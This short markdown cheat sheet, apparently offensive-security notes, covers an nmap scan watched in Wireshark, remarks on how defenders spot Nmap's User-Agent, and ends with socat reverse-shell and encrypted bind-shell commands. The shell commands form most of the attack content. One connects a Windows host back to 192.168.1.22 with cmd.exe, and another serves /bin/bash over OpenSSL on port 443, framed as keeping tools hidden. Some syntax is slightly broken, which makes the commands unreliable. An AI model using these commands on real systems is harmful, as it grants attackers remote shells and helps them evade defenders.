# Socat Reverse Shell
Steps to ensure our tools and scans stay hidden. 

## 1. Choose an interface to monitor
`ip a` - View networking information

`eth0` - Selected interface

## 2. Setup a Filter in Wireshark & Capture
Set `tcp.port == 23` in the filter and press capture to monitor traffic.

## 3. Run Scan
`nmap -sV -sC 192.168.1.1 23` 

## 4. View results in Wireshark
By default "Nmap" is printed as the User-Agent making it easily detectiable by defenders. 

## 5. Socat Reverse Shell
A reverse shell gives you access back to the target computer.

```sh
socat -d TCP4-LISTEN:23, fork STDOUT
#or
socat.exe TCP4:192.168.1.22:23 EXEC:'cmd.exe', pipes

```

## 6. Use Encryption

```sh
socat OPENSSL-LISTEN:443,cert-bind_shell.pem,verify=0,fork EXEC:/bin/bash
```


